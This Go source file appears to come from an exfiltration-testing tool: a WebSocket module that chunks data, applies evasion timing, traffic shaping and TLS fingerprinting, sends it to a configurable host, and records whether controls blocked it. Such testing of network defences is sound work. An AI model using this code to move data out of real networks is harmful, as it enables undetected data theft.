package web

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"

	"github.com/shehzade/contraband/pkg/client/evasion"
	"github.com/shehzade/contraband/pkg/client/exfil"
	"github.com/shehzade/contraband/pkg/common"
	"nhooyr.io/websocket"
)

type WebSocketExfiltrator struct{}

func NewWebSocketExfiltrator() *WebSocketExfiltrator {
	return &WebSocketExfiltrator{}
}

func init() {
	wsExfil := NewWebSocketExfiltrator()
	exfil.RegisterExfiltrator(common.ProtoWebSocket, wsExfil)
	exfil.RegisterExfiltrator("websocket", wsExfil)
	exfil.RegisterExfiltrator("ws", wsExfil)
}

func (e *WebSocketExfiltrator) Protocol() string {
	return common.ProtoWebSocket
}

func (e *WebSocketExfiltrator) Exfiltrate(ctx context.Context, reader io.Reader, opts exfil.ExfilOptions) (*common.ProbeResult, error) {
	if err := opts.Validate(); err != nil {
		return nil, err
	}

	start := time.Now().UTC()
	result, err := common.NewProbeResult("exfil", e.Protocol(), opts.TargetHost, opts.TargetPort)
	if err != nil {
		return nil, err
	}
	result.Timestamps.StartTCP = start
	result.TLSProfile = opts.TLSFingerprint
	result.PayloadType = opts.PayloadType
	result.CarrierType = opts.CarrierType

	if opts.TotalBytes <= 0 {
		if br, ok := reader.(*bytes.Reader); ok {
			opts.TotalBytes = int64(br.Len())
		} else if bb, ok := reader.(*bytes.Buffer); ok {
			opts.TotalBytes = int64(bb.Len())
		}
	}

	if opts.ExpectedHash == "" {
		if br, ok := reader.(*bytes.Reader); ok {
			cur, _ := br.Seek(0, io.SeekCurrent)
			h := sha256.New()
			_, _ = io.Copy(h, br)
			opts.ExpectedHash = hex.EncodeToString(h.Sum(nil))
			_, _ = br.Seek(cur, io.SeekStart)
		}
	}
	result.PayloadHash = opts.ExpectedHash

	if opts.SessionToken.IsZero() {
		tok, tokErr := common.NewSessionToken()
		if tokErr != nil {
			return nil, tokErr
		}
		opts.SessionToken = tok
	}

	chunker, err := evasion.NewStreamChunker(reader, opts.SessionToken, opts.ChunkSize, opts.TotalBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to initialize chunk streamer: %w", err)
	}
	defer chunker.Close()

	totalChunks := chunker.TotalChunks()
	result.TargetVolume = opts.TotalBytes

	isTLS := opts.UseTLS || (opts.TargetPort != 80 && opts.InsecureTLS) || opts.TargetPort == 443 || opts.TargetPort == 8443 || opts.TargetPort == 9443 || opts.TargetPort == 10443
	scheme := "ws"
	if isTLS {
		scheme = "wss"
	}
	wsURL := fmt.Sprintf("%s://%s:%d/ws", scheme, opts.TargetHost, opts.TargetPort)

	dialOpts := &websocket.DialOptions{
		HTTPHeader: make(http.Header),
	}
	dialOpts.HTTPHeader.Set(common.HeaderSessionID, opts.SessionToken.String())
	dialOpts.HTTPHeader.Set(common.HeaderPayloadHash, opts.ExpectedHash)
	for k, v := range opts.Headers {
		dialOpts.HTTPHeader.Set(k, v)
	}

	if isTLS {
		tlsCfg := exfil.TLSConfig{
			ServerName:         opts.TargetHost,
			InsecureSkipVerify: opts.InsecureTLS,
			Fingerprint:        opts.TLSFingerprint,
			ALPN:               []string{"http/1.1"},
		}
		tr := exfil.NewHTTPTransport(tlsCfg)
		if opts.ProxyDialer != nil {
			tr.DialContext = opts.ProxyDialer.DialContext
		}
		dialOpts.HTTPClient = &http.Client{Transport: tr, Timeout: opts.Timeout}
	} else if opts.ProxyDialer != nil {
		tr := &http.Transport{
			DialContext: opts.ProxyDialer.DialContext,
		}
		dialOpts.HTTPClient = &http.Client{Transport: tr, Timeout: opts.Timeout}
	}

	conn, _, err := websocket.Dial(ctx, wsURL, dialOpts)
	if err != nil {
		result.Verdict = common.ClassifyError(err)
		result.ErrorMessage = fmt.Sprintf("websocket dial failed: %v", err)
		result.Timestamps.TeardownDone = time.Now().UTC()
		e.calculateDurations(&result)
		return &result, err
	}
	conn.SetReadLimit(16 * 1024 * 1024)
	defer conn.Close(websocket.StatusInternalError, "deferred exit")

	result.Timestamps.ConnectedTCP = time.Now().UTC()
	if isTLS {
		result.Timestamps.HandshakeTLS = time.Now().UTC()
	}
	result.Timestamps.FirstByteSent = time.Now().UTC()

	var lastMsgType websocket.MessageType
	var lastAckData []byte
	var headEvidence []byte

	for {
		chunkFrame, _, err := chunker.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			result.Verdict = common.ClassifyError(err)
			result.ErrorMessage = err.Error()
			result.Timestamps.TeardownDone = time.Now().UTC()
			e.calculateDurations(&result)
			return &result, err
		}

		if len(headEvidence) < 768 && len(chunkFrame) > common.ChunkHeaderSize {
			p := chunkFrame[common.ChunkHeaderSize:]
			needed := 768 - len(headEvidence)
			if needed > len(p) {
				needed = len(p)
			}
			headEvidence = append(headEvidence, p[:needed]...)
		}

		if opts.Shaper != nil {
			if err := opts.Shaper.WaitN(ctx, len(chunkFrame)); err != nil {
				result.Verdict = common.ClassifyError(err)
				result.ErrorMessage = err.Error()
				result.Timestamps.TeardownDone = time.Now().UTC()
				e.calculateDurations(&result)
				return &result, err
			}
		}

		if opts.Cadence != nil {
			delay := opts.Cadence.NextDelay()
			if delay > 0 {
				select {
				case <-time.After(delay):
				case <-ctx.Done():
					result.Verdict = common.ClassifyError(ctx.Err())
					result.ErrorMessage = ctx.Err().Error()
					result.Timestamps.TeardownDone = time.Now().UTC()
					e.calculateDurations(&result)
					return &result, ctx.Err()
				}
			}
		}

		if err := conn.Write(ctx, websocket.MessageBinary, chunkFrame); err != nil {
			result.Verdict = common.ClassifyError(err)
			result.ErrorMessage = fmt.Sprintf("websocket write failed: %v", err)
			result.Timestamps.TeardownDone = time.Now().UTC()
			e.calculateDurations(&result)
			return &result, err
		}
		result.BytesSent += int64(len(chunkFrame))

		// Read per-chunk ACK
		msgType, ackData, err := conn.Read(ctx)
		if err != nil {
			result.Verdict = common.ClassifyError(err)
			result.ErrorMessage = fmt.Sprintf("failed to read websocket ack: %v", err)
			result.Timestamps.TeardownDone = time.Now().UTC()
			e.calculateDurations(&result)
			return &result, err
		}
		result.BytesRecv += int64(len(ackData))

		var chunkAck common.VerificationACK
		if err := json.Unmarshal(ackData, &chunkAck); err == nil && chunkAck.Status == "ERROR" {
			if chunkAck.Verdict != "" {
				result.Verdict = chunkAck.Verdict
			} else {
				result.Verdict = common.VerdictBlockedL7
			}
			result.ErrorMessage = chunkAck.ErrorMessage
			result.Timestamps.TeardownDone = time.Now().UTC()
			e.calculateDurations(&result)
			return &result, fmt.Errorf("%s", chunkAck.ErrorMessage)
		}

		lastMsgType = msgType
		lastAckData = ackData
	}
	_ = lastMsgType

	result.Timestamps.AckReceived = time.Now().UTC()
	result.Timestamps.TeardownDone = time.Now().UTC()

	_ = conn.Close(websocket.StatusNormalClosure, "exfil complete")

	// Parse and strictly verify cryptographic verification ACK
	var ack common.VerificationACK
	if err := json.Unmarshal(lastAckData, &ack); err != nil {
		result.Verdict = common.VerdictBlockedL7
		result.ErrorMessage = fmt.Sprintf("failed to parse websocket verification ACK: %v", err)
		e.calculateDurations(&result)
		return &result, fmt.Errorf("invalid verification ACK: %w", err)
	}

	verdict, verifyErr := ack.Verify(opts.ExpectedHash, int(totalChunks))
	result.Verdict = verdict
	if verifyErr != nil {
		result.ErrorMessage = verifyErr.Error()
		e.calculateDurations(&result)
		return &result, verifyErr
	}

	result.RawEvidence = common.FormatBoundedRawEvidence(headEvidence)
	e.calculateDurations(&result)
	return &result, nil
}

func (e *WebSocketExfiltrator) calculateDurations(r *common.ProbeResult) {
	t := &r.Timestamps
	if t.TeardownDone.IsZero() {
		t.TeardownDone = time.Now().UTC()
	}
	t.ComputeDurations()
	if t.TransferDuration > 0 {
		r.ThroughputBps = float64(r.BytesSent*8) / (float64(t.TransferDuration) / float64(time.Second)) / 1000.0
	}
}
